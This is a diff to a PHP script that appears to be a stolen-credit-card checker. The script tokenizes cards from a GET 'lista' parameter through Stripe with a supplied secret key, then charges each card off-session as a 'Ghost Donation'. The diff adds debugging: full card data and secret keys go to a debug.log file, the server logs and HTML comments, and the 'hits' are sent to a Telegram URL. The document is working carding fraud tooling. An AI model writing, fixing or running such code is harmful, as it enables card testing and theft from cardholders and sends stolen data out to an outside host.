@@ -1,6 +1,7 @@
 <?php
 
-error_reporting(0);
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 date_default_timezone_set('America/Buenos_Aires');
 
 
@@ -38,6 +39,9 @@ $lista = $_GET['lista'];
 if (strlen($mes) == 1) $mes = "0$mes";
 if (strlen($ano) == 2) $ano = "20$ano";
 
+// Log input parameters
+file_put_contents('debug.log', "Input: lista=$lista, sec=$sk, cst=$amt, domain=$domain\n", FILE_APPEND);
+
 //================= [ CURL REQUESTS ] =================//
 
 #-------------------[1st REQ]--------------------#
@@ -61,15 +65,22 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
-// type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'
+$postfields1 = 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'';  
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields1);
 $result1 = curl_exec($ch);  
+$http_code1 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$curl_error1 = curl_error($ch);
 
 $tok1 = Getstr($result1,'"id": "','"');  
 
 $msg = Getstr($result1,'"message": "','"');  
 
-//echo "<br><b>Result1: </b> $result1<br>";  
+// Log full details
+$log1 = "1st Request:\nURL: https://api.stripe.com/v1/payment_methods\nPOST: $postfields1\nHTTP Code: $http_code1\nError: $curl_error1\nResponse: $result1\n\n";
+file_put_contents('debug.log', $log1, FILE_APPEND);
+error_log($log1); // To server logs/console
+
+echo "<!-- Debug 1st REQ: HTTP $http_code1 | Error: $curl_error1 | Response: " . htmlspecialchars($result1) . " -->";
 
 if (strpos($result1, "rate_limit"))   
 
@@ -106,15 +117,23 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+$postfields2 = 'amount='.$chr.'&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method='.$tok1.'&confirm=true&off_session=true';
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields2);  
 
 $result2 = curl_exec($ch);  
+$http_code2 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$curl_error2 = curl_error($ch);
 
 $tok2 = Getstr($result2,'"id": "','"');  
 
 $receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
 
-//echo "<br><b>Result2: </b> $result2<br>";  
+// Log full details
+$log2 = "2nd Request:\nURL: https://api.stripe.com/v1/payment_intents\nPOST: $postfields2\nHTTP Code: $http_code2\nError: $curl_error2\nResponse: $result2\n\n";
+file_put_contents('debug.log', $log2, FILE_APPEND);
+error_log($log2); // To server logs/console
+
+echo "<!-- Debug 2nd REQ: HTTP $http_code2 | Error: $curl_error2 | Response: " . htmlspecialchars($result2) . " -->";
 
 if (strpos($result2, "rate_limit"))   
 
@@ -143,6 +162,13 @@ $max_retries = 1;
 $num_retries = 0;
 $sendchargedtotg = false;
 $sendinsufftotg = false;
+
+// Send to Telegram and log
+$tg_response = @file_get_contents($sendcharged);
+$tg_log = "Telegram Send: URL=$sendcharged\nResponse: $tg_response\n\n";
+file_put_contents('debug.log', $tg_log, FILE_APPEND);
+error_log($tg_log);
+echo "<!-- Debug Telegram: Response: " . htmlspecialchars($tg_response) . " -->";
 // ---------------------------------------------------- Hit To Telegram End-------------------------------
 
 //=================== [ RESPONSES ] ===================//
